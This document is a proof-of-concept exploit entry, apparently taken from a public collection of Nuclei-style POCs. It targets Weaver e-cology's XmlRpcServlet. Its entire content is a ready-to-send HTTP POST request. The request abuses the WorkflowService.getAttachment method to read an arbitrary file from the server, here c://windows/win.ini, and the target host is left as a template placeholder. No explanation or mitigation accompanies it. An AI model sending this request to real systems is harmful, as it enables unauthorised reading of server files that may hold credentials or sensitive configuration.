# weaver_xmlrpcservlet_fileread
from: https://github.com/Vme18000yuan/FreePOC/blob/master/poc/neclei/weaver-ecology-XmlRpcServlet-FileRead.yaml
```
POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 200

<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>
```
